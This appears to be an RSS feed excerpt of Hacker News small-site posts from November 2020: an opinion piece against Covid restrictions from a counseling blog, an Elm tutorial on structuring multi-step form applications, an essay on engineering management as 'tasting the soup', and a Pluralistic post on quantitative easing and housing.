          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5ec4c062e4738d39529ebd00/1604258489470-A7L6EDA7D6VRBSLO58JU/ke17ZwdGBToddI8pDm48kLkXF2pIyv_F2eUT9F60jBl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iyqMbMesKd95J-X4EagrgU9L3Sa3U8cogeb0tjXbfawd0urKshkc5MgdBeJmALQKw/fear-children-anxiety-counseling.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5ec4c062e4738d39529ebd00/1604258489470-A7L6EDA7D6VRBSLO58JU/ke17ZwdGBToddI8pDm48kLkXF2pIyv_F2eUT9F60jBl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iyqMbMesKd95J-X4EagrgU9L3Sa3U8cogeb0tjXbfawd0urKshkc5MgdBeJmALQKw/fear-children-anxiety-counseling.jpg" data-image-dimensions="2500x1667" data-image-focal-point="0.5,0.5" alt="fear-children-anxiety-counseling.jpg" data-load="false" data-image-id="5f9f0ab2aa6e763a1bff5eb4" data-type="image" src="https://www.journeysbridge.com/blog/fear-children-anxiety-counseling.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-yui_3_17_2_1_1604258003048_48911"><div><p>I hear from some parents and teachers that they fear viral spread at school. &nbsp;Fear is a very powerful motivator.&nbsp; I am not dismissing this concern.&nbsp; The concern is real, and there is no doubt that some spread will occur.&nbsp; My best suggestion to parents or teachers struggling with this fear is to bring into your thinking some countering thoughts.&nbsp; Learn about the statistics more.&nbsp; Avoid fear-mongering media reports on anecdotes. &nbsp;Understand the difference between statistics and anecdotes and the logical fallacy of confusing them. &nbsp;</p><p>In any large number of people (like 330 million), we will be able to find heartbreaking stories and terrible examples.&nbsp; That does not mean it is common or likely.&nbsp; Imagine stories about shark attacks.&nbsp; They do happen.&nbsp; But, every year since the dawn of civilization, humans have enjoyed the beach, and will continue to enjoy the beach – even in the face of the exceedingly rare shark attack.&nbsp; We can’t let the proverbial Covid shark attack story prevent children from enjoying their childhoods.</p><p>Do what you would do with any fearful thinking.&nbsp; Treat it the same.&nbsp; Bring in more rationality, more context, and reduce catastrophizing.&nbsp; Remind yourselves of the countervailing cost to a generation of children and empower yourself to do what is best for our children. </p></div></div><div data-block-type="5" id="block-7a3fd97c77fe496315cc"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5ec4c062e4738d39529ebd00/1604258590866-8DF5SM5SW7R52SEG0XM0/ke17ZwdGBToddI8pDm48kLkXF2pIyv_F2eUT9F60jBl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iyqMbMesKd95J-X4EagrgU9L3Sa3U8cogeb0tjXbfawd0urKshkc5MgdBeJmALQKw/eldery-anxiety-counseling.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5ec4c062e4738d39529ebd00/1604258590866-8DF5SM5SW7R52SEG0XM0/ke17ZwdGBToddI8pDm48kLkXF2pIyv_F2eUT9F60jBl7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0iyqMbMesKd95J-X4EagrgU9L3Sa3U8cogeb0tjXbfawd0urKshkc5MgdBeJmALQKw/eldery-anxiety-counseling.jpg" data-image-dimensions="2500x1667" data-image-focal-point="0.5,0.5" alt="eldery-anxiety-counseling.jpg" data-load="false" data-image-id="5f9f0b129e7da9554f4e641d" data-type="image" src="https://www.journeysbridge.com/blog/eldery-anxiety-counseling.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-c84e6c8f4298f84047fc"><div><p><strong>Lost humanity in how we treat our elderly</strong></p><p>This is the most difficult challenge in the pandemic, as the elderly are the ones at relatively significant risk.&nbsp; It’s heartbreaking to see the rates of dementia rising precipitously - likely resulting from loneliness and sparse human contact.&nbsp; Many nursing home residents have not had contact with their families for many months.&nbsp; It’s excruciatingly sad to think of a mother/father slowly wasting away in a nursing home without physical visits from loved ones.&nbsp; </p><p>One of the core features of our collective sense of humanity is that we make great efforts to be with loved ones as they die.&nbsp; It’s a common and fervent wish that most people have – to not die alone.&nbsp; And, yet, thousands are experiencing this fate because of public policies and fear.&nbsp; Not only is it unfair to them, but also to the families who will carry a heavy burden of guilt for the rest of their lives because they were not able to hold the hand of a dying family member.</p><p>This must stop.  We can safely visit loved ones in nursing homes.  It will require more sacrifice from family members to prepare for visits, but policies need to allow for multiple people to visit in-person regularly.  And, the visits must be physical and up-close.  Waving through a window to an elderly person struggling with dementia is confusing, disorienting and ultimately upsetting.  Physical contact, hugs and hand-holding will do a great deal to restore their emotional and physical health.  We must not lose our humanity in our response to fear.</p></div></div><div data-block-type="5" id="block-00874342b002706698c2"><div>








  

    
  
    <div data-test="image-block-inline-outer-wrapper">

      

      
        <figure>
          
        
        

        
          
            
          <p><img data-src="https://images.squarespace-cdn.com/content/v1/5ec4c062e4738d39529ebd00/1604258693835-I4450T8KWVMHGN3H1EOM/ke17ZwdGBToddI8pDm48kL4DOY4me-4EzFudtdlscHh7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0p4XabXLlNWpcJMv7FrN_NJT3PQjv9PI42hSy0udUFa31OUY-9okg-dm0rQz_JE3jw/fear-career-counseling.jpg" data-image="https://images.squarespace-cdn.com/content/v1/5ec4c062e4738d39529ebd00/1604258693835-I4450T8KWVMHGN3H1EOM/ke17ZwdGBToddI8pDm48kL4DOY4me-4EzFudtdlscHh7gQa3H78H3Y0txjaiv_0fDoOvxcdMmMKkDsyUqMSsMWxHk725yiiHCCLfrh8O1z4YTzHvnKhyp6Da-NYroOW3ZGjoBKy3azqku80C789l0p4XabXLlNWpcJMv7FrN_NJT3PQjv9PI42hSy0udUFa31OUY-9okg-dm0rQz_JE3jw/fear-career-counseling.jpg" data-image-dimensions="2500x1479" data-image-focal-point="0.5,0.5" alt="fear-career-counseling.jpg" data-load="false" data-image-id="5f9f0b82a48e4130fe051586" data-type="image" src="https://www.journeysbridge.com/blog/fear-career-counseling.jpg">
          </p>
        
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div data-block-type="2" id="block-dfe89276e490c2fdee91"><div><p><strong>Millions in despair over lost livelihoods</strong></p><p>People and their ways of making a living are not unessential to our society.&nbsp; Everyone’s job is ultimately essential to them and their families.&nbsp; We need to stop letting fear of Covid determine who society deems as an essential worker.&nbsp; The emotional damage being wrought by these policies, and ways of perceiving our fellow citizens, is severe.</p><p>Deaths of despair have been rising during the pandemic.&nbsp; Suicides and drug overdoses have taken far too many lives.&nbsp; The rates of depression and anxiety have skyrocketed as mental health organizations are reporting record numbers of people seeking emotional assistance.&nbsp; And, the damage does not end with each suffering individual.&nbsp; Their pain extends out into their families and local communities, just like a virus can extend out from someone who is ill.&nbsp; The tentacles of despair reach out from spouse to spouse, from parents to children, from friends to co-workers – creating a pall over daily life for millions who have lost livelihoods.</p><p>We should not underestimate the all-encompassing effects of losing a livelihood.&nbsp; Work gives meaning to so many lives.&nbsp; It provides daily purpose and a sense of doing your part in the world.&nbsp; Losing this is on par with other major losses in life, and it is not healed quickly.&nbsp; Society’s tacit acceptance of these losses out of fear needs to stop.&nbsp; </p><p>If we recall the purpose of many employment restrictions back in March, it was to “flatten the curve,” not eradicate the virus. &nbsp;We needed to make certain that our health care system would not be overwhelmed.&nbsp; It worked.&nbsp; Health care was stretched, but it never broke.&nbsp; However, fear set in, and we shifted to a mentality of zero-tolerance for any spread.&nbsp; Millions of people can withstand weeks or a month of lost livelihoods, but not 6+ months. &nbsp;Zero spread is not realistic and the damage to people from lost livelihoods needs to end.</p><div><p>Again, I hear from people who are fearful that fully opening bars, restaurants, gyms, performance halls and other similar venues will lead to the spread of the virus.  Yes, the truth is that there will be spread as a result.  However, from a mental health perspective, I would encourage more rationality in considering this truth.  Challenge the fearful thinking with more context.  Consider the countervailing costs to the millions of people who are suffering every day that society restricts their livelihoods.  Consider all the positive information on treatments/therapeutics which have been developed over the last 7 months – and the plummeting fatality rates.  Consider how long society can live in fear without permanent consequences.  Empower yourself to choose to face the fear and overcome.</p><p><strong>Health is a bigger picture</strong></p></div><p>Fear of Covid spread has become an end unto itself.&nbsp; It is …</p></div></div></div></div></div></article></section></main></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.journeysbridge.com/blog/normal-life-again">https://www.journeysbridge.com/blog/normal-life-again</a></em></p>]]>
            </description>
            <link>https://www.journeysbridge.com/blog/normal-life-again</link>
            <guid isPermaLink="false">hacker-news-small-sites-25019333</guid>
            <pubDate>Sat, 07 Nov 2020 21:03:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I Write Elm Applications]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25019281">thread link</a>) | @yakshaving_jgt
<br/>
November 7, 2020 | https://jezenthomas.com/how-i-write-elm-applications/ | <a href="https://web.archive.org/web/*/https://jezenthomas.com/how-i-write-elm-applications/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <article>
    
    <p>
      <span>November  7, 2020</span>
      
      | Gdańsk, Poland
      
    </p>
    <p>Most of my work over the past 10 years has involved writing what is often called a <em>wizard</em>.</p>
<p>A wizard is essentially a multi-step process that guides a user through a particular workflow. For example, if you are installing a new application on your computer, the wizard might guide you through the following process:</p>
<ol type="1">
<li>Enter your license registration details</li>
<li>Agree to the software author’s legal terms</li>
<li>Specify an installation location</li>
</ol>
<p>Most web applications provide something similar. If a user needs to input a large amount of data for the application to then run a bunch of calculations, you could of course just provide the user with one big web form. At a certain size though, a single web form can be intimidating and provide a less than ideal user experience. The canonical way to improve the user experience here is to break up the web form into several separate pages. This is another example of a wizard.</p>
<figure>
<img src="https://jezenthomas.com/static/img/wizard-diagram.jpg" alt="Forms are easier to digest when they’re split into separate steps"><figcaption>Forms are easier to digest when they’re split into separate steps</figcaption>
</figure>
<p>I’ve tried writing wizards in a number of different web technologies, and so far Elm has proven itself as by far the most robust and painless, <em>especially</em> when it inevitably comes to changing some conditional logic to meet the mutable needs of various business processes.</p>
<p>For any small Elm application, project structure is easy. There is no reason why a 1,000 line Elm application can’t live in a single file. In fact this is really how every Elm application ought to begin its life. Start with a single file with the usual boilerplate and the following contents:</p>
<ul>
<li>A single sum type to model all of the messages your application supports</li>
<li>A single model which contains all the application state</li>
<li>A single update function for advancing the application state</li>
<li>A single view function for rendering the application state on the page</li>
</ul>
<p>If your web form is complex enough to warrant being broken into separate pages however, then your application is naturally not going to consist of a small number of lines of code. A common concern among less experienced Elm programmers is that one big sum type for all of your messages becomes unwieldy to maintain. The same is said of having one big shallow record for all of the application state, or one big <code>update</code> function to match all the constructors of the one big <code>Msg</code> type. This is where unnecessary complexity starts to balloon as programmers add <em>clever</em> abstractions and misdirections, usually involving both <code>Html.map</code> and <code>Cmd.map</code>, separate <code>update</code> functions for each logical subsection of your application (usually with noticeably awkward type signatures), and some vague hand-waving in the direction of <em>encapsulation</em> and so-called <em>Clean Code</em>.</p>
<p>I’d argue that this kind of misdirection is almost <em>never</em> what you want. I’d argue further that this applies <em>especially</em> to you if your background is in maintaining complex React/Angular applications, where invented complexity is the status quo and this kind of misdirection is simply what you have become desensitised to.</p>
<p>So if the combination of <code>Html.map</code> and <code>Cmd.map</code> are to be avoided, how can we scale an Elm application without sacrificing developer ergonomics? In short, the tricks to employ are:</p>
<ul>
<li>Nested sum types</li>
<li>Nested record types</li>
<li>Nested update functions</li>
<li>Small, composable view functions</li>
<li>Function composition</li>
<li>Lenses</li>
</ul>
<p>Let’s take a look at a more concrete application of these ideas. As an example, we can model the process of a person applying for a bank loan.</p>
<p>The bank will want to ask the applicant a whole bunch of questions, which we could group into three categories:</p>
<ol type="1">
<li>Personal information</li>
<li>Details on the purpose of the loan</li>
<li>Financial information and creditworthiness</li>
</ol>
<p>This would suggest a three-step wizard or a three-page web form. A reasonable place to begin splitting our application apart into three smaller pieces is in our <code>Msg</code> type.</p>
<h2 id="the-big-msg-type">The Big Msg Type</h2>
<p>The naïve way to model the messages our application should support is with one big sum type, which might look something like this:</p>
<pre><code>type Page
  = PersonalInformationPage
  | LoanPurposePage
  | FinancialDetailsPage

type Msg
  -- System-wide messages
  = NoOp
  | SetPage Page
  -- etc…

  -- Personal information
  | SetFirstName String
  | SetLastName String
  | SetAddressLine1 String
  -- …more messages for the personal information page

  -- Purpose of the loan
  | SetPurchaseItemCategory
  | SetPurchaseItemEstimatedValue
  -- …more messages for the loan purpose page

  -- Financial information
  | SetMonthlyIncomeBeforeTax
  | SetMonthlyRentPayment
  -- …more messages about the applicant's financial details</code></pre>
<p>This <em>does</em> work, but at some point it becomes cumbersome to support a large number of constructors. The value for “large” is of course determined by the individual programmer’s personal taste and/or pain threshold. To ease this pain, people typically <em>extract</em> groups of messages into their own separate sum types, which subsequently forces them to write update functions that return a type <em>other</em> than the top-level <code>Msg</code> type.</p>
<p><em>Don’t do that!</em></p>
<p>The way to break these groups of constructors out is by first nesting them inside the <code>Msg</code> type, like this:</p>
<pre><code>type PersonalInformationMsg
  = SetFirstName String
  | SetLastName String
  | SetAddressLine1 String
  -- etc..

type LoanPurposeMsg -- etc…

type FinancialDetailsMsg -- etc…

type Msg
  = NoOp
  | SetPage Page
  | PersonalInformationMsg PersonalInformationMsg
  | LoanPurposeMsg LoanPurposeMsg
  | FinancialDetailsMsg FinancialDetailsMsg</code></pre>
<p>The new message types can live in the same file as the top-level <code>Msg</code> type. They can also be extracted to different files. That’s your choice.</p>
<p>The next thing to tackle is our <code>update</code> function, since it needs to mirror our <code>Msg</code> type.</p>
<h2 id="nested-update-functions">Nested Update Functions</h2>
<p>I’ve seen people advocate for page-specific <code>update</code> functions which take a page-specific model and return a tuple of that page-specific model and a page-specific <code>Cmd Msg</code> equivalent. This is typically where you see <code>Cmd.map</code> sneaking in. These functions almost inevitably end up needing <em>something</em> from the top-level application-wide state, so you’ll often see some type signature like this:</p>
<pre><code>updatePersonalInformation
   : Model
  -&gt; (PersonalInformationModel, Cmd PersonalInformationMsg)
  -&gt; (Model, Cmd Msg)</code></pre>
<p>This is <em>way</em> too complex already, and this approach doesn’t even actually buy you anything.</p>
<p>The far simpler way to do this is to have every nested <code>update</code> function take a page-specific message, the <em>entire</em> application state, and return the same type for that state along with the top-level <code>Msg</code> type, like this:</p>
<pre><code>updatePersonalInformation : PersonalInformationMsg -&gt; Model -&gt; (Model, Cmd Msg)
updatePersonalInformation msg model = case msg of
  SetFirstName a    -&gt; -- …
  SetLastName a     -&gt; -- …
  SetAddressLine1 a -&gt; -- …
  -- etc…

update : Msg -&gt; Model -&gt; (Model, Cmd Msg)
update msg model = case msg of
  NoOp -&gt; (model, Cmd.none)
  SetPage page -&gt; ({ model | page = page }, Cmd.none)
  PersonalInformationMsg subMsg -&gt; updatePersonalInformation subMsg model
  LoanPurposeMsg subMsg -&gt; updateLoanPurpose subMsg model
  FinancialDetailsMsg subMsg -&gt; updateFinancialDetails subMsg model</code></pre>
<p>No complicated type signatures. No juggling of message types. No <code>Cmd.map</code>. Easy.</p>
<p>Of course the whole point of our <code>update</code> function is to advance the state of our model, and the structure of that model is also something that can swell and become unwieldy, so that’s what we will dissect next.</p>
<h2 id="record-surgery">Record Surgery</h2>
<p>Near the inception of the project, all of our individual bits of state might exist at the top level of our <code>Model</code>, which is typically represented as a record. Perhaps something like this:</p>
<pre><code>type alias Model =
  { page : Page
  , firstName : String
  , lastName : String
  , addressLine1 : String
  -- …more personal information fields

  , purchaseItemCategory : ItemCategory
  , purchaseItemEstimatedValue : Money
  -- …more loan purpose fields…

  -- …and also financial details, and system-wide state, etc…
  }</code></pre>
<p>Like the parts of our project we’ve addressed previously, this also can turn into a bit of a mess as it grows. Both application-wide data and page-specific data are mixed in together which feels a bit haphazard. Fortunately, grouping and extracting these fields is typically rather intuitive. We can start by grouping page-specific parts of the state together, and then group further until it no longer <em>feels</em> messy.</p>
<pre><code>type alias Address =
  { line1 : String
  , line2 : String
  , city : String
  , postcode : String
  -- …
  }

type alias PersonalInformation =
  { firstName : String
  , lastName : String
  , address : Address
  -- …
  }

type alias LoanPurpose =
  { purchaseItemCategory : ItemCategory
  , purchaseItemEstimatedValue : Money
  -- …
  }

type alias FinancialDetails = -- …

type alias Model =
  { page : Page
  , personalInformation : PersonalInformation
  , loanPurpose : LoanPurpose
  , financialDetails : FinancialDetails
  }</code></pre>
<p>The problem now however is that when we wish to update a deeply-nested field, we need to write all of the code to unwrap each level until we arrive at the depth we need. Illustrated another way, let’s say we want to update the first line of the applicant’s address.</p>
<p>Retrieving the value of this field is no problem, as we can use Elm’s dot syntax to succinctly get us all the way there, like this:</p>
<pre><code>model.personalInformation.address.line1</code></pre>
<p>What we <em>can’t</em> do here however is <em>update</em> that field in a similar fashion, <em>i.e.</em>, Elm won’t allow us to write something like this:</p>
<pre><code>-- This won't work
{ model.personalInformation.address | line1 = newLine1 }

-- This also won't work
{ model | personalInformation.address.line1 = newLine1 }</code></pre>
<p>The naïve way to unwrap and subsequently update the field in this record is to write something like this:</p>
<pre><code>updatePersonalInformation : PersonalInformationMsg -&gt; Model -&gt; (Model, Cmd Msg)
updatePersonalInformation msg model = case msg of
  SetFirstName _ -&gt; -- …

  SetLastName _ -&gt; -- …

  SetAddressLine1 newLine1 -&gt;
    let
        personalInformation =
          …</code></pre></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jezenthomas.com/how-i-write-elm-applications/">https://jezenthomas.com/how-i-write-elm-applications/</a></em></p>]]>
            </description>
            <link>https://jezenthomas.com/how-i-write-elm-applications/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25019281</guid>
            <pubDate>Sat, 07 Nov 2020 21:00:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[What do good Engineering Managers do? They taste the soup]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25019206">thread link</a>) | @ablekh
<br/>
November 7, 2020 | https://no-kill-switch.ghost.io/what-do-good-engineering-managers-do-they-taste-the-soup | <a href="https://web.archive.org/web/*/https://no-kill-switch.ghost.io/what-do-good-engineering-managers-do-they-taste-the-soup">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article data-post-id="5f665b145e15b200392aedb9">
	

	<section>
		<p>Sometimes you encounter a striking figure of speech, comparison or just a metaphor that illustrates some concept in a much better way than anything you knew until now. It's so good you can't let it get unnoticed. In my case, it happened e.g. when I've learned to think about architects as "navigators". Or quite recently, while I was reading a very decent book by <a href="https://twitter.com/rands">Michael Lopp</a> - <a href="https://www.goodreads.com/book/show/50083106-the-art-of-leadership">"The Art of Leadership: Small Things, Done Well"</a>.</p><p>Speaking about the latter: my epiphany moment happened during chapter IV, entirely dedicated to the author's actionable advice for engineering leaders. The concluding one was about a reasonable alternative to micro-management: Lopp calls it ... <em>"tasting the soup"</em>. And I think it's brilliant and 100% spot-on.</p><p><strong>Tasting the soup</strong> - what does it mean?</p><p>Imagine a professional chef. A chief boss-cook. A reigning monarch of the kitchen (e.g. in a top-notch, highly reputed, Michelin-starred restaurant). (S)he is the person accountable for the quality of the holistic culinary experience here. It's his(/her) reputation at stake if customers are dissatisfied (for any reason). But still, it doesn't mean (s)he does all the job him(/her)self (to guarantee a suitable level of quality) - quite the opposite. There's the talented, hand-picked crew doing all the "dirty" work, while the chef-in-charge:</p><ul><li>tastes</li><li>probes</li><li>verifies</li></ul><p>It's not that (s)he cares only about the final outcome - the 100% ready dish. (S)he engages <u>at all the various stages</u> (of meal preparation): by inspecting raw materials, half-cooked ingredients, nearly ready products about to get the final touch. &nbsp;What's more - the soup is <u>"multi-dimensional"</u> - it has several equally important aspects (to assess separately): consistency, smell, color, temperature, sweetness, bitterness, spiciness, etc.</p><p>Needless to say - the chef can't (&amp; shouldn't) be everywhere, all the time. (S)he <strong>can't assist every elementary activity</strong> - which is good and ... desirable. One <u>should not judge</u> the effect by the activities performed (which are - in many cases - meaningful "implementation" details or just elements of a highly-individualized style) but <strong>by the outcomes and how they match expectations </strong>(stated beforehand).</p><p>That's why (s)he restrains her(/him)self <u>to taste and probe</u> - it's sufficient because of <strong>past, practical experience</strong>. Precisely because of her/his experience, (s)he knows what to expect, whether the chosen direction is correct, whether there's a chance the final product will be edible &amp; satisfactory (aka will meet the given success criteria). (S)he's been there, (s)he's seen that. And as the one who knows what to expect, the chef is more probably able to detect all those very early warning lights and propose corrective actions.</p><p>Let me emphasize it again - micro-managing all the actions is not the way. Even with experience - <strong>it's NOT possible to know all the correct paths</strong>. Never ever. The number (of correct, good enough options) is endless.</p><p>I hope you've already figured it out by yourself - this chef soup tasting story can be easily mapped onto engineering management scenarios. Everything that has been said about the chef above can be directly translated into software development leaders' reality — starting with the role of experience and the importance of probing the effects (the current state of - process, tooling, various stages of deliverable completeness).</p><p>The default mode of an engineering manager's work should NOT be to dive deep into every possible (implementation) detail - it's just not feasible (but necessary in carefully chosen, critical situations that demand a more direct approach because of some warning lights flashing). A good engineering manager has to be able to:</p><ul><li>quickly orient her(/him)self in a situational context</li><li>identify the qualities that need to be assessed at this point</li><li>find a way to inspect them efficiently and objectively</li><li>confront the perceived learnings with expectations and past experience of similar endeavors</li></ul><p>In other words - to <em>"taste the engineering soup"</em>.</p><p>I think this metaphor is useful not just in calibrating your efforts (as an engineer manager), but also (as it's very "visual") can be very helpful in clarifying the meaning and importance of the engineering manager role: why is it needed, what value does it provide and what kind of input can one expect from a person bearing such a role.</p>
	</section>

	
</article></div>]]>
            </description>
            <link>https://no-kill-switch.ghost.io/what-do-good-engineering-managers-do-they-taste-the-soup</link>
            <guid isPermaLink="false">hacker-news-small-sites-25019206</guid>
            <pubDate>Sat, 07 Nov 2020 20:53:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[QE, inflation, slave labor and a People's Bailout]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25019106">thread link</a>) | @headalgorithm
<br/>
November 7, 2020 | https://pluralistic.net/2020/11/07/obamas-third-term/#peoplesbailout | <a href="https://web.archive.org/web/*/https://pluralistic.net/2020/11/07/obamas-third-term/#peoplesbailout">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-1568">
	<!-- .entry-header -->

	
	
	<div>
		<p><!--
Tags:
job guarantee,pavlina tcherneva,qe, quantitative easing, economics, people's bailout, asset bubbles, inflation

Summary:
QE, inflation, slave labor and a People's Bailout

URL:
https://pluralistic.net/2020/11/07/obamas-third-term/

Title:
Pluralistic: 07 Nov 2020 obamas-third-term

Bullet:
🦺

Separator:
_,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,__,.-'~'-.,_

Top Sources:
Today's top sources: Naked Capitalism (https://www.nakedcapitalism.com/).

--><br>
<a href="https://pluralistic.net/2020/11/07/obamas-third-term/"><img src="https://i2.wp.com/craphound.com/images/07Nov2020.jpg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/craphound.com/images/07Nov2020.jpg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></a></p>

<ul>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2020/11/07/obamas-third-term/#peoplesbailout">QE, inflation, slave labor and a People's Bailout</a>: Uber is a (terrible) job guarantee program.
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2020/11/07/obamas-third-term/#retro">This day in history</a>: 2005, 2010, 2015, 2019
</li>
<li attrs="{'class': ['xToC']}"><a attrs="{'href': '#xslug'}" href="https://pluralistic.net/2020/11/07/obamas-third-term/#bragsheet">Colophon</a>: Recent publications, upcoming appearances, current writing projects, current reading
</li>
</ul>

<hr>
<p><a name="peoplesbailout"></a><br>
<img src="https://i2.wp.com/craphound.com/images/jobguaranteebreadline.jpg?w=840&amp;ssl=1" data-recalc-dims="1" data-lazy-src="https://i2.wp.com/craphound.com/images/jobguaranteebreadline.jpg?w=840&amp;is-pending-load=1#038;ssl=1" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>

<p>The Obama administration inherited a vast economic crisis. They responded with Quantitative Easing, pumping trillions into the finance sector to rescue the banks that had knowingly gambled on bad mortgages, losing so much they were about to go under.</p>
<p><a href="https://www.cnbc.com/2017/11/24/the-fed-launched-qe-nine-years-ago--these-four-charts-show-its-impact.html">https://www.cnbc.com/2017/11/24/the-fed-launched-qe-nine-years-ago–these-four-charts-show-its-impact.html</a></p>
<p>At the time, deficit hawks predicted inflation, which is a commonsense prediction: inflation is what happens when the amount of money chasing goods and services goes up faster than the supply of those goods and services, creating bidding wars.</p>
<p>They were right…and wrong. What we got was asset bubbles, especially in housing markets, driving up the price of putting a roof over your head rewarding speculators and landlords, especially Wall Street landlords.</p>
<p>And Obama's handling of the financial crisis put a lot of us under the thumbs of landlords! Obama bailed out the banks, but not the mortgage holders, kicking off waves of foreclosures.</p>
<p>Thanks to lax oversight, banks that had cheated to originate or service mortgages were able to cheat on foreclosures, too – stealing houses from borrowers who were up-to-date on payments or who were entitled to forebearance.</p>
<p><a href="https://web.archive.org/web/20101017014628/http://news.yahoo.com/s/yblog_upshot/20101014/bs_yblog_upshot/is-david-j-stern-the-poster-boy-for-the-foreclosure-mess">https://web.archive.org/web/20101017014628/http://news.yahoo.com/s/yblog_upshot/20101014/bs_yblog_upshot/is-david-j-stern-the-poster-boy-for-the-foreclosure-mess</a></p>
<p>I mean, literally stealing houses by the hundreds or even the thousands. The very same people who created the great financial crisis got bailed out, rather than punished, and used their new lease on life to commit even worse crimes with total impunity.</p>
<p>The houses that were foreclosed (and sometimes stolen) were flipped to Wall Street, who LOVE financial products based on peoples' homes. After all, people will move heaven and earth to keep shelter over their kids' heads.</p>
<p><a href="https://www.motherjones.com/politics/2014/02/blackstone-rental-homes-bundled-derivatives/">https://www.motherjones.com/politics/2014/02/blackstone-rental-homes-bundled-derivatives/</a></p>
<p>Corporate landlords built a sturdy, three-legged stool to guarantee the flow of rents to their investors.</p>
<p>I. Jack up rents to consume the majority of tenants' income:</p>
<p><a href="https://www.nakedcapitalism.com/2017/09/wall-street-owns-main-street-literally.html">https://www.nakedcapitalism.com/2017/09/wall-street-owns-main-street-literally.html</a></p>
<p>II. Cease maintenance, knowing that your tenants have no recourse if their homes are crumbling and unsafe:</p>
<p><a href="https://www.reuters.com/investigates/special-report/usa-housing-invitation/">https://www.reuters.com/investigates/special-report/usa-housing-invitation/</a></p>
<p>III. Perfect the eviction, heretofore an American rarity:</p>
<p><a href="https://www.bloomberg.com/news/articles/2017-01-03/wall-street-america-s-new-landlord-kicks-tenants-to-the-curb">https://www.bloomberg.com/news/articles/2017-01-03/wall-street-america-s-new-landlord-kicks-tenants-to-the-curb</a></p>
<p>America's housing crisis – substandard homes rented at unsustainable costs to people who had their own homes stolen from them by the same investors they're currently paying rent to – is a major legacy of QE, and it's definitely inflationary.</p>
<p>But it's a highly selective form of inflation. Many people won't experience it at all: if you owned your house before the crisis and weathered it, the asset bubble has made your home more valuable, while falling interest rates let you refi at rock-bottom rates. You're great.</p>
<p>You're paying less than ever for a home that's worth more than ever, but that's a spillover effect of the main show, which is the process by which millions of Americans were robbed of their homes and then moved into high-priced slums to the benefit of the 1%.</p>
<p>Both Obama and Trump have boasted of the economy's performance since QE, pointing to soaring share prices – share prices that are totally decoupled from company performance. Companies lose money and still gain value.</p>
<p>Indeed, predatory companies (like Grubhub, Postmates, Door Dash and Uber Eats) that destroy profitable companies (restaurants) while still losing money are booming in value.</p>
<p><a href="https://pluralistic.net/2020/05/18/code-is-speech/#schadenpizza">https://pluralistic.net/2020/05/18/code-is-speech/#schadenpizza</a></p>
<p>Investors understand that consumers have no money, due to rising housing costs plus crashing wages, largely thanks to the "gig economy," a polite term for "worker misclassification."</p>
<p>Companies that get bailouts would be stupid to spend the money on jobs or new productive capacity to make stuff no one can afford to buy. Instead, they buy their own shares and declare dividends, driving up share prices.</p>
<p><a href="https://pluralistic.net/2020/10/20/the-cadillac-of-murdermobiles/#austerity">https://pluralistic.net/2020/10/20/the-cadillac-of-murdermobiles/#austerity</a></p>
<p>We have seen an incredible market bull-run since the Great Financial Crisis, a run that has largely continued since the pandemic. It's the other asset bubble: a bubble in investment assets.</p>
<p>Corporate leaders claim responsibility for these rises, but the reality is that it's the predictable result of bailing out banks and companies rather than workers and homeowners.</p>
<p>Société Générale's analysts say that about half of the stock market's gains since 2008 can be attributed to QE.</p>
